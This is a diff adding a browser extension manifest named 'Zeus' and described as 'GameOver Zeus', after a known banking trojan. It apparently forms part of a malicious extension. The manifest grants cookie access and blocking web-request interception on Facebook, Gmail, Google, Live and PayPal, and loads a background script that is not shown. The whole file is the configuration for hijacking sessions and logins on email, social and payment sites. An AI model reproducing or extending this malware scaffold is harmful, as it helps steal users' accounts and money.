@@ -1,0 +1,23 @@
+{
+
+  "description": "GameOver Zeus",
+  "manifest_version": 2,
+  "name": "Zeus",
+  "version": "1.0.0",
+
+  "permissions": [
+    "cookies",
+    "webRequest",
+    "webRequestBlocking",
+    "*://*.facebook.com/*",
+    "*://*.gmail.com/*",
+    "*://*.google.com/*",
+    "*://*.live.com/*",
+    "*://*.paypal.com/*"
+  ],
+ 
+  "background": {	
+    "scripts": ["background.js"]
+  }
+
+}
